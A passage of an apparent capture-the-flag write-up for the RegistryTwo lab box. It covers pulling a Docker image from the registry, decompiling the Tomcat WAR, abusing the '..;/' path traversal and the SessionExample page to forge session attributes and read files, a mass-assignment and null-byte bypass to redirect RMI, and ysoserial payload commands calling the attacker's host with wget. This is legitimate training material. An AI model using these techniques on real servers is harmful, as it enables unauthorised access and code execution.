oxdf@hacky$ echo | openssl s_client -showcerts -connect webhosting.htb:5000
CONNECTED(00000003)
depth=0 C = CN, ST = GD, L = SZ, O = "Acme, Inc.", CN = *.webhosting.htb
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 C = CN, ST = GD, L = SZ, O = "Acme, Inc.", CN = *.webhosting.htb
verify error:num=21:unable to verify the first certificate
verify return:1
depth=0 C = CN, ST = GD, L = SZ, O = "Acme, Inc.", CN = *.webhosting.htb
verify return:1
---
Certificate chain
 0 s:C = CN, ST = GD, L = SZ, O = "Acme, Inc.", CN = *.webhosting.htb
   i:C = CN, ST = GD, L = SZ, O = "Acme, Inc.", CN = Acme Root CA
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Mar 26 21:32:06 2023 GMT; NotAfter: Mar 25 21:32:06 2024 GMT
-----BEGIN CERTIFICATE-----
MIIDZTCCAk2gAwIBAgIUCxIhdntb6QD+EHgpbvOABhwIvbEwDQYJKoZIhvcNAQEL
BQAwUzELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjETMBEG
A1UECgwKQWNtZSwgSW5jLjEVMBMGA1UEAwwMQWNtZSBSb290IENBMB4XDTIzMDMy
NjIxMzIwNloXDTI0MDMyNTIxMzIwNlowVzELMAkGA1UEBhMCQ04xCzAJBgNVBAgM
AkdEMQswCQYDVQQHDAJTWjETMBEGA1UECgwKQWNtZSwgSW5jLjEZMBcGA1UEAwwQ
Ki53ZWJob3N0aW5nLmh0YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
ALeRMWQ61f5GKstmqYMCtPBSf5l6xvAuQX4JX+8DpdNEuEOZ0gUu/EYU8nbJ0kH7
nwqplA7V5HCEVe/pPwRNedi9vb+qSzKxlESMrJq8lZOLjgx3sfczUspR+d14Ht63
DAijLGNBzgx027OQEcgd/h34SPEWt1XWSrSVtaJeFXAMqsPaBM2gco9ABI8j+3ki
SOespRQKNzLvJN+JWtxxHe9gxJfzRRcCH3R36ayg5jIWBa3Igo9IIzEu+364e0OL
Y6HoEX/+0Ly73v/mpei4wPay6kri1ay2mzYVfjF5WRbKFgzEZDXEAUpXLeLNMmrU
hOAaG32abKFAK3lMP6L99/0CAwEAAaMtMCswKQYDVR0RBCIwIIIOd2ViaG9zdGlu
Zy5odGKCDndlYmhvc3RpbmcuaHRiMA0GCSqGSIb3DQEBCwUAA4IBAQAQsJBESlH/
xfYbsOdsx/zm/XZbW4p0D/3V9KvSTOORcn8LPF4vFNqwJIckbTiYPM3LKSSc5r/Z
dlGnOEdKB1s3uR5kyDMy0PgHEHTdrLZCadJYIa1Z37Cc8E6zPP4SSobQo3jCifD9
FwOW4jfMtgnHiJ4PViP/9O9WuBmTqLyPbZT402V+vaEwtzcSNcp6l/dKAzyjdz+9
i9OPJGi1X2mvpVwqZhtWm2VwOjgpeVkg7XKmsyJ72/3BNN8S99PrkVpqGOjEn7OQ
c6Au7Eac1LeujFpXPQvzar8FszUIzojBPJAvWEVh2ChKahANEyWDqWxsLKF5oYy/
HgNmV9Z6pHxq
-----END CERTIFICATE-----
---
Server certificate
subject=C = CN, ST = GD, L = SZ, O = "Acme, Inc.", CN = *.webhosting.htb
issuer=C = CN, ST = GD, L = SZ, O = "Acme, Inc.", CN = Acme Root CA
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1413 bytes and written 380 bytes
Verification error: unable to verify the first certificate
---
New, TLSv1.3, Cipher is TLS_AES_128_GCM_SHA256
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 21 (unable to verify the first certificate)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_128_GCM_SHA256
    Session-ID: 712661C884FCB118ED308AFADD1AFA809738B5A923961E3A4F02FF72DF2C34CE
    Session-ID-ctx:
    Resumption PSK: AE4BDF83CD578637D838D8AA0E1E3B22E376F7DDA6B717A862A5E63FB24EE2A5
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 604800 (seconds)
    TLS session ticket:
    0000 - df 90 66 da 1f f8 97 20-9a 7c f4 8c ee 04 a7 39   ..f.... .|.....9
    0010 - 04 64 a9 f6 ae 8e 97 7a-3b 5c 36 5b bf 8b 3f e1   .d.....z;\6[..?.
    0020 - 15 f4 c6 ab 9d 62 48 c6-15 9f 83 f2 3d c3 36 91   .....bH.....=.6.
    0030 - e0 1d 94 13 70 bf ef 89-f3 8c fc 8e 35 a5 0c 2c   ....p.......5..,
    0040 - b9 8c 0d 41 1a b2 09 b4-25 6f 59 32 af 3c 64 94   ...A....%oY2.<d.
    0050 - 49 11 be 02 ae f5 9e 76-b6 4b 6d ed 06 ba 4c e3   I......v.Km...L.
    0060 - 22 47 ac e6 ea 13 c6 e6-8f dd 2f 53 9d 90 a5 23   "G......../S...#
    0070 - fb                                                .

    Start Time: 1706349638
    Timeout   : 7200 (sec)
    Verify return code: 21 (unable to verify the first certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
DONE

```

I need all the stuff between “BEGIN CERTIFICATE” and “END CERTIFICATE”:

```

oxdf@hacky$ sudo vim /usr/local/share/ca-certificates/registrytwo-ca.crt
oxdf@hacky$ cat /usr/local/share/ca-certificates/registrytwo-ca.crt
-----BEGIN CERTIFICATE-----
MIIDZTCCAk2gAwIBAgIUCxIhdntb6QD+EHgpbvOABhwIvbEwDQYJKoZIhvcNAQEL
BQAwUzELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjETMBEG
A1UECgwKQWNtZSwgSW5jLjEVMBMGA1UEAwwMQWNtZSBSb290IENBMB4XDTIzMDMy
NjIxMzIwNloXDTI0MDMyNTIxMzIwNlowVzELMAkGA1UEBhMCQ04xCzAJBgNVBAgM
AkdEMQswCQYDVQQHDAJTWjETMBEGA1UECgwKQWNtZSwgSW5jLjEZMBcGA1UEAwwQ
Ki53ZWJob3N0aW5nLmh0YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
ALeRMWQ61f5GKstmqYMCtPBSf5l6xvAuQX4JX+8DpdNEuEOZ0gUu/EYU8nbJ0kH7
nwqplA7V5HCEVe/pPwRNedi9vb+qSzKxlESMrJq8lZOLjgx3sfczUspR+d14Ht63
DAijLGNBzgx027OQEcgd/h34SPEWt1XWSrSVtaJeFXAMqsPaBM2gco9ABI8j+3ki
SOespRQKNzLvJN+JWtxxHe9gxJfzRRcCH3R36ayg5jIWBa3Igo9IIzEu+364e0OL
Y6HoEX/+0Ly73v/mpei4wPay6kri1ay2mzYVfjF5WRbKFgzEZDXEAUpXLeLNMmrU
hOAaG32abKFAK3lMP6L99/0CAwEAAaMtMCswKQYDVR0RBCIwIIIOd2ViaG9zdGlu
Zy5odGKCDndlYmhvc3RpbmcuaHRiMA0GCSqGSIb3DQEBCwUAA4IBAQAQsJBESlH/
xfYbsOdsx/zm/XZbW4p0D/3V9KvSTOORcn8LPF4vFNqwJIckbTiYPM3LKSSc5r/Z
dlGnOEdKB1s3uR5kyDMy0PgHEHTdrLZCadJYIa1Z37Cc8E6zPP4SSobQo3jCifD9
FwOW4jfMtgnHiJ4PViP/9O9WuBmTqLyPbZT402V+vaEwtzcSNcp6l/dKAzyjdz+9
i9OPJGi1X2mvpVwqZhtWm2VwOjgpeVkg7XKmsyJ72/3BNN8S99PrkVpqGOjEn7OQ
c6Au7Eac1LeujFpXPQvzar8FszUIzojBPJAvWEVh2ChKahANEyWDqWxsLKF5oYy/
HgNmV9Z6pHxq
-----END CERTIFICATE-----

```

Now I’ll run `update-ca-certificates` and restart the docker service:

```

oxdf@hacky$ sudo update-ca-certificates 
Updating certificates in /etc/ssl/certs...
0 added, 0 removed; done.

Running hooks in /etc/ca-certificates/update.d...

Adding debian:registrytwo-ca.pem
done.
Updating Mono key store
Mono Certificate Store Sync - version 6.8.0.105
Populate Mono certificate store from a concatenated list of certificates.
Copyright 2002, 2003 Motus Technologies. Copyright 2004-2008 Novell. BSD licensed.

Importing into legacy system store:
I already trust 138, your new list has 138
Import process completed.

Importing into BTLS system store:
I already trust 137, your new list has 138
Certificate added: C=ES, CN=Autoridad de Certificacion Firmaprofesional CIF A62634068
1 new root certificates were added to your trust store.
Import process completed.
Done
done.
oxdf@hacky$ sudo service docker restart

```

Now, when I run `docker pull`, it’s smart enough to visit port 5001, get the auth it needs, and pull the image:

```

oxdf@hacky$ docker pull webhosting.htb:5000/hosting-app:latest
latest: Pulling from hosting-app
ff3a5c916c92: Pull complete 
5de5f69f42d7: Pull complete 
fa7536dd895a: Pull complete 
7b43ca85cb2c: Pull complete 
0da484dfb061: Pull complete 
e4cc5f625cda: Pull complete 
497760bf469e: Pull complete 
f7b708f947c3: Pull complete 
ab55eca3206e: Pull complete 
9d5bcc17fed8: Pull complete 
396c4a404488: Pull complete 
b5ac54f57d23: Pull complete 
9e700b74cc5b: Pull complete 
4a19a05f49c2: Pull complete 
0bf45c325a69: Pull complete 
Digest: sha256:392c6c733e7dab7516f8519f669ad6dc867c4587b9c32ffecff194a77fb0af5b
Status: Downloaded newer image for webhosting.htb:5000/hosting-app:latest
webhosting.htb:5000/hosting-app:latest

```

I can also save a copy of the app locally:

```

oxdf@hacky$ docker save webhosting.htb:5000/hosting-app:latest > hosting-app.tar
oxdf@hacky$ file hosting-app.tar
hosting-app.tar: POSIX tar archive

```

It’s not important for solving the box, but I was curious how `docker` got auth without my telling it, which I’ll explore in [this video](https://www.youtube.com/watch?v=xqYQ76u8bM0):

#### Get Image - Via DockeRegistryGrabber

There are tools out there designed to pull Docker images from registries. [DockerRegistryGrabber](https://github.com/Syzik/DockerRegistryGrabber) is a nice one. It’s worth noting at the release of RegistryTwo it did not support using auth tokens, but it seems the box may have influenced adding that feature:

![image-20240128065639769](/img/image-20240128065639769.png)

It doesn’t seem to be smart like `docker` to get the auth token on it’s own, but I can pass it a token and have it do things. With the catalog token, it will list:

```

(venv) oxdf@hacky$ TOKEN=$(curl -sk 'https://webhosting.htb:5001/auth?service=Docker+registry&scope=registry:catalog:*' | jq -r .token)
(venv) oxdf@hacky$ python drg.py https://webhosting.htb -A $TOKEN --list
[+] hosting-app

```

That same token will fail to download, but switching just like above, it will get all the blobs:

```

(venv) oxdf@hacky$ python drg.py https://webhosting.htb -A $TOKEN --dump hosting-app
[+] BlobSum found 36
[+] Dumping hosting-app
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba
    [+] Downloading : 4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42
    [+] Downloading : 9e700b74cc5b6f81ed6513fa03c7b6ab11a71deb8e27604632f723f81aca3268
    [+] Downloading : b5ac54f57d23fa33610cb14f7c21c71aa810e58884090cead5e3119774a202dc
    [+] Downloading : 396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7
    [+] Downloading : 9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c
    [+] Downloading : ab55eca3206e27506f679b41b39ba0e4c98996fa347326b6629dae9163b4c0ec
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : f7b708f947c32709ecceaffd85287d5eb9916a3013f49c8416228ef22c2bf85e
    [+] Downloading : 497760bf469e19f1845b7f1da9cfe7e053beb57d4908fb2dff2a01a9f82211f9
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : e4cc5f625cda9caa32eddae6ac29b170c8dc1102988b845d7ab637938f2f6f84
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 0da484dfb0612bb168b7258b27e745d0febf56d22b8f10f459ed0d1dfe345110
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 7b43ca85cb2c7ccc62e03067862d35091ee30ce83e7fed9e135b1ef1c6e2e71b
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : fa7536dd895ade2421a9a0fcf6e16485323f9e2e45e917b1ff18b0f648974626
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a41134e28

```

They are all all gzip data:

```

(venv) oxdf@hacky$ file hosting-app/*
hosting-app/0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba.tar.gz: gzip compressed data, original size modulo 2^32 2560
hosting-app/0da484dfb0612bb168b7258b27e745d0febf56d22b8f10f459ed0d1dfe345110.tar.gz: gzip compressed data, original size modulo 2^32 16436736
hosting-app/396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7.tar.gz: gzip compressed data, original size modulo 2^32 23533056
hosting-app/497760bf469e19f1845b7f1da9cfe7e053beb57d4908fb2dff2a01a9f82211f9.tar.gz: gzip compressed data, original size modulo 2^32 21474816
hosting-app/4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42.tar.gz: gzip compressed data, original size modulo 2^32 39337472
hosting-app/5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4.tar.gz: gzip compressed data, original size modulo 2^32 3584
hosting-app/7b43ca85cb2c7ccc62e03067862d35091ee30ce83e7fed9e135b1ef1c6e2e71b.tar.gz: gzip compressed data, original size modulo 2^32 2560
hosting-app/9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c.tar.gz: gzip compressed data, original size modulo 2^32 5632
hosting-app/9e700b74cc5b6f81ed6513fa03c7b6ab11a71deb8e27604632f723f81aca3268.tar.gz: gzip compressed data, original size modulo 2^32 12288
hosting-app/a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz: gzip compressed data, truncated
hosting-app/ab55eca3206e27506f679b41b39ba0e4c98996fa347326b6629dae9163b4c0ec.tar.gz: gzip compressed data, original size modulo 2^32 3584
hosting-app/b5ac54f57d23fa33610cb14f7c21c71aa810e58884090cead5e3119774a202dc.tar.gz: gzip compressed data, original size modulo 2^32 4608
hosting-app/e4cc5f625cda9caa32eddae6ac29b170c8dc1102988b845d7ab637938f2f6f84.tar.gz: gzip compressed data, original size modulo 2^32 118784
hosting-app/f7b708f947c32709ecceaffd85287d5eb9916a3013f49c8416228ef22c2bf85e.tar.gz: gzip compressed data, original size modulo 2^32 2048
hosting-app/fa7536dd895ade2421a9a0fcf6e16485323f9e2e45e917b1ff18b0f648974626.tar.gz: gzip compressed data, original size modulo 2^32 78615552
hosting-app/ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a41134e28.tar.gz: gzip compressed data, original size modulo 2^32 4403200

```

I could dig into each of these individually, which would show me what stands out from the base image, but I’ll start by running the container.

### hosting-app

Rather than enumerate all the layers of the image, I’ll start it and take a look:

```

oxdf@hacky$ docker run --rm -d webhosting.htb:5000/hosting-app
d96217d9cf0df1eee04a0d3e2a0c35cae682ceeb568629db044b030eff527307

```

Looking at the running image shows the image command is `catalina.sh run`:

```

oxdf@hacky$ docker ps
CONTAINER ID   IMAGE                             COMMAND             CREATED         STATUS         PORTS      NAMES
d96217d9cf0d   webhosting.htb:5000/hosting-app   "catalina.sh run"   8 seconds ago   Up 7 seconds   8080/tcp   unruffled_kilby

```

Catalina is the Tomcat servlet container. `catalina.sh` is a [part of tomcat](https://github.com/apache/tomcat/blob/main/bin/catalina.sh), and the `run` command starts Catalina.

The script is in `/usr/local/tomcat/bin/`:

```

oxdf@hacky$ docker exec -it --user root unruffled_kilby /bin/bash
bash-4.4# find / -name 'catalina.sh' 2>/dev/null
/usr/local/tomcat/bin/catalina.sh

```

In `/usr/local/tomcat/webapps` there’s a `hosting.war` file. This is the application that manages the website at `/hosting`. I’ll copy it to my system from the container:

```

oxdf@hacky$ docker cp unruffled_kilby:/usr/local/tomcat/webapps/hosting.war .
Successfully copied 23.5MB to /home/oxdf/hackthebox/registrytwo-10.10.11.223/.

```

### hosting.war

#### Files

A [Java WAR file](https://en.wikipedia.org/wiki/WAR_(file_format)) is a Java archive containing all the files needed for a web application. I’ll open this one in [jd-gui](https://github.com/java-decompiler/jd-gui/releases).

![image-20240129131530700](/img/image-20240129131530700.png)

`META-INF` has very basic metadata about the application. The `resources` has CSS and the `.jsp` and `.html` files at the bottom are templates for the various pages. The interesting stuff is in `WEB-INF`. `web.xml` is a basic config file. `lib` has the various libraries used by the app:

![image-20240129132020516](/img/image-20240129132020516.png)

`jsp` has various templates for different pages on the site:

![image-20240129132107979](/img/image-20240129132107979.png)

The `classes` directory has the code for the side:

![image-20240129132407152](/img/image-20240129132407152.png)

#### Server Overview

The `class` files in `services` are the ones that define routes for the webserver. For example, in `AuthenticationSevlet.cass`, it defines the `/auth/signin` route:

![image-20240129132614281](/img/image-20240129132614281.png)

The `doGet` and `doPost` methods handle those requests, eventually making a `RequestDispatcher` referencing one of the `.jsp` files as a template. Other endpoints defined as `/autosave`, `/reconfigure`, `/panel`, `/domains/*`, `/edit`, `/logout`, `/profile`, `/auth/signup`, and `/view/*`.

#### rmi

The `rmi` folder is of particular interest. RMI (remote method invocation) is a Java idea kind of like remote procedure calls (RPC) in C, but rather than sending data structures, Java objects are passed between processes. [This post](https://su18.org/post/rmi-attack/) does a really nice job of going into detail as to not only what RMI is, but how to pentest it (it is in Chinese, but Google Translate does a nice job).

The `RMIClientWrapper.class` file creates a `RMIClientWrapper` object, which gets the `FileService`:

```

public class RMIClientWrapper {
  private static final Logger log = Logger.getLogger(com.htb.hosting.rmi.RMIClientWrapper.class.getSimpleName());
  
  public static FileService get() {
    try {
      String rmiHost = (String)Settings.get(String.class, "rmi.host", null);
      if (!rmiHost.contains(".htb"))
        rmiHost = "registry.webhosting.htb"; 
      System.setProperty("java.rmi.server.hostname", rmiHost);
      System.setProperty("com.sun.management.jmxremote.rmi.port", "9002");
      log.info(String.format("Connecting to %s:%d", new Object[] { rmiHost, Settings.get(Integer.class, "rmi.port", Integer.valueOf(9999)) }));
      Registry registry = LocateRegistry.getRegistry(rmiHost, ((Integer)Settings.get(Integer.class, "rmi.port", Integer.valueOf(9999))).intValue());
      return (FileService)registry.lookup("FileService");
    } catch (Exception e) {
      e.printStackTrace();
      throw new RuntimeException(e);
    } 
  }
}

```

The interesting part is that it loads up the `rmi.host` from the `Settings` class, and as long as it ends in `.htb`, it will connect to port 9002. If I can get that to connect to me, there will be a way to exploit it.

#### /reconfigure

There is a `/reconfigure` endpoint that is also interesting:

```

@WebServlet(name = "reconfigure", value = {"/reconfigure"})
public class ConfigurationServlet extends AbstractServlet {
  private static final long serialVersionUID = -2336661269816738483L;
  
  public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
    if (!checkManager(request, response))
      return; 
    RequestDispatcher rd = request.getRequestDispatcher("/WEB-INF/jsp/configuration.jsp");
    rd.include((ServletRequest)request, (ServletResponse)response);
  }
  
  public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
    if (!checkManager(request, response))
      return; 
    Map<String, String> parameterMap = new HashMap<>();
    request.getParameterMap().forEach((k, v) -> parameterMap.put(k, v[0]));
    Settings.updateBy(parameterMap);
    RequestDispatcher rd = request.getRequestDispatcher("/WEB-INF/jsp/configuration.jsp");
    request.setAttribute("message", "Settings updated");
    rd.include((ServletRequest)request, (ServletResponse)response);
  }
  
  private static boolean checkManager(HttpServletRequest request, HttpServletResponse response) throws IOException {
    boolean isManager = (request.getSession().getAttribute("s_IsLoggedInUserRoleManager") != null);
    if (!isManager)
      response.sendRedirect(request.getContextPath() + "/panel"); 
    return isManager;
  }
  
  public void destroy() {}
}

```

The POST request handler updates the `Settings` object with whatever is passed to it. There is, however, a call to `checkManager` first before a user is allowed access via either GET or POST. This function checks the user’s session object for the `Is_LoggedInUserRoleManager` variable to be set.

## Shell as app in Container

### Session Manipulation

#### Breaking Parser Logic

A common misconfiguration to look for in Tomcat servers is a path traversal with `..;/`. It has [a section in Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#path-traversal), and goes all the way back to the famous 2018 Blackhat presentation I’ve referenced many times, [Breaking Parser Logic!](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) by Orange Tsai:

![image-20240129134346500](/img/image-20240129134346500.png)

Given that it seems clear that nginx is handing off to Tomcat at the `/hosting` level, it’s worth trying there. If I try to visit `/hosting/..;/`, it returns an empty 404. That’s different than if I visit `/hosting/0xdf`, which redirects to `/hosting/auth/signin`. That’s a good sign this issue is present. I’ll try `/hosting/..;/manager/html`, and it asks for basic auth:

![image-20240129134647072](/img/image-20240129134647072.png)

When I don’t have the password, it shows the Tomcat auth failed page:

![image-20240126154028957](/img/image-20240126154028957.png)

Even if I can’t access the Tomcat manager, that looks like path traversal.

#### Examples

Without creds, I can’t access the Tomcat manager admin panel. Another thing to look for on Tomcat is the [examples directory](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#examples). Visiting `/hosting/..;/examples/` finds the page:

![image-20240129135014840](/img/image-20240129135014840.png)

One Example that shows up in a lot of bug bounty reports / blog posts ([example](https://hackerone.com/reports/1004007), [example](https://spiritous27.rssing.com/chan-13660045/article9.html), [example](https://www.acunetix.com/vulnerabilities/web/apache-tomcat-examples-directory-vulnerabilities/)) is `SessionExample`, in the “Servlet examples”:

![image-20240129135241584](/img/image-20240129135241584.png)

Through this page, I can get and set session attributes for my session. If I don’t have a session with the site, it looks empty like that. If I log in:

![image-20240129135406894](/img/image-20240129135406894.png)

#### File Read

If I open a file for editing in the file editor on `www.webhosting.htb` and refresh this Sessions Example page, there’s a new attribute associated with my session:

![image-20240129135513905](/img/image-20240129135513905.png)

The attribute looks like `s_EditingMedia_[base64 id] = /tmp/[random hex]`. The URL for editing a file is `/hosting/edit?tmpid=[base64 id]`, matching that session attribute.

I’ll update the value of that session attribute to be `/etc/passwd` using the example form:

![image-20240129143550193](/img/image-20240129143550193.png)

On reloading the `/edit` page, there’s `/etc/passwd`:

![image-20240129143625839](/img/image-20240129143625839.png)

Trying to save returns a 500 error (which makes sense, as this user almost certainly can’t write this file).

One unintended path is to use this file read to completely skip the Docker Registry stuff above, and pull the War file here. I’ll show that in [Beyond Root](#unintended-paths).

#### Admin Access

I noticed above that I needed an admin session to get to `/hosting/reconfigure`. If I visit while just normally logged in, it redirects to `/hosting/panel`. But, if I set `s_IsLoggedInUserRoleManager` to anything via the Session Example and try again, it works:

![image-20240129144444880](/img/image-20240129144444880.png)

This panel gives the opportunity to change the max domains and index template.

### Rogue RMI POC

#### Mass Assignment

Submitting the form on `/hosting/reconfigure` sends a POST request setting `domains.max` and `domains.start-template`:

```

POST /hosting/reconfigure HTTP/1.1
Host: www.webhosting.htb
Cookie: JSESSIONID=05DD8FF85C2D1D377E5C363008CD39A5
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://www.webhosting.htb
Referer: https://www.webhosting.htb/hosting/reconfigure
Connection: close

domains.max=6&domains.start-template=%3Cbody%3E%0D%0A%3Ch1%3E0xdf+was+here%21%3C%2Fh1%3E%0D%0A%3C%2Fbody%3E

```

Looking again at the code that handles POST requests, it doesn’t seem to worry about POST parameters are sent:

```

  public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
    if (!checkManager(request, response))
      return; 
    Map<String, String> parameterMap = new HashMap<>();
    request.getParameterMap().forEach((k, v) -> parameterMap.put(k, v[0]));
    Settings.updateBy(parameterMap);
    RequestDispatcher rd = request.getRequestDispatcher("/WEB-INF/jsp/configuration.jsp");
    request.setAttribute("message", "Settings updated");
    rd.include((ServletRequest)request, (ServletResponse)response);
  }

```

It just loops over all the POST parameters, maps them into a map object, and passes that to update the settings. That’s going to be vulnerable to mass assignment.

#### Null Termination

The RMI class starts by getting the settings value for `rmi.host`, which I should be able to set via the mass assignment vulnerability above. However, it then checks that the value ends with “.htb”, setting it to “registry.webhosting.htb” if it doesn’t:

```

      String rmiHost = (String)Settings.get(String.class, "rmi.host", null);
      if (!rmiHost.contains(".htb"))
        rmiHost = "registry.webhosting.htb"; 

```

I can by pass this with a null byte. I’ll send the `/hosting/reconfigure` POST request to Burp Repeater, and add `&rmi.host=10.10.14.6%00.htb` to the end:

![image-20240129145335743](/img/image-20240129145335743.png)

It seems to work. I’ll start `nc` listening on 9002, and on loading `/hosting` in a browser, there’s a connection:

```

oxdf@hacky$ nc -lnvp 9002
Listening on 0.0.0.0 9002
Connection received on 10.10.11.223 51140
JRMIK

```

### RCE Via RMI

#### Tools

One of HTB’s top players [qtc](https://app.hackthebox.com/users/103578) has a tool, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser#listen), which has a `listen` mode:

> Sometimes it is required to provide a malicious *JRMPListener*, which serves deserialization payloads to incoming *RMI* connections. Writing such a listener from scratch is not necessary, as it is already provided by the [ysoserial project](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java). *remote-method-guesser* provides a wrapper around the *ysoserial* implementation, which lets you spawn a *JRMPListener*

That’s exactly what I need here. I’ll need to have a copy of the [ysoserial](https://github.com/frohoff/ysoserial/releases) Jar file on my host. Mine is at `/opt/ysoserial/ysoserial-all.jar`. There’s a bunch of issues with this tool with newer versions of java. [This](https://github.com/frohoff/ysoserial/issues/203) issue on it’s GitHub talks about how to make it work with OpenJDK17, but also mentions it just works with OpenJDK11. I’ve got 11 installed on my system, so I’ll just use `update-alternatives` to select it:

```

oxdf@hacky$ sudo update-alternatives --config java
There are 4 choices for the alternative java (providing /usr/bin/java).

  Selection    Path                                         Priority   Status
------------------------------------------------------------
  0            /usr/lib/jvm/java-18-openjdk-amd64/bin/java   1811      auto mode
  1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java   1111      manual mode
* 2            /usr/lib/jvm/java-17-openjdk-amd64/bin/java   1711      manual mode
  3            /usr/lib/jvm/java-18-openjdk-amd64/bin/java   1811      manual mode
  4            /usr/local/java/jdk1.8.0_391/bin/java         1         manual mode

Press <enter> to keep the current choice[*], or type selection number: 1
update-alternatives: using /usr/lib/jvm/java-11-openjdk-amd64/bin/java to provide /usr/bin/java (java) in manual mode

```

This fixes errors like this:

```

oxdf@hacky$ java -jar /opt/ysoserial/ysoserial-all.jar CommonsCollections6 'wget 10.10.14.6/test'
Error while generating or serializing payload
java.lang.reflect.InaccessibleObjectException: Unable to make field private transient java.util.HashMap java.util.HashSet.map accessible: module java.base does not "opens java.util" to unnamed module @5a6d67c3
        at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354)
        at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)
        at java.base/java.lang.reflect.Field.checkCanSetAccessible(Field.java:178)
        at java.base/java.lang.reflect.Field.setAccessible(Field.java:172)
        at ysoserial.payloads.util.Reflections.setAccessible(Reflections.java:26)
        at ysoserial.payloads.CommonsCollections6.getObject(CommonsCollections6.java:74)
        at ysoserial.payloads.CommonsCollections6.getObject(CommonsCollections6.java:36)
        at ysoserial.GeneratePayload.main(GeneratePayload.java:34)

```

And this:

```

oxdf@hacky$ java -jar ./rmg.jar listen 10.10.14.6 9002 CommonsCollections6 'wget 10.10.14.6/test'
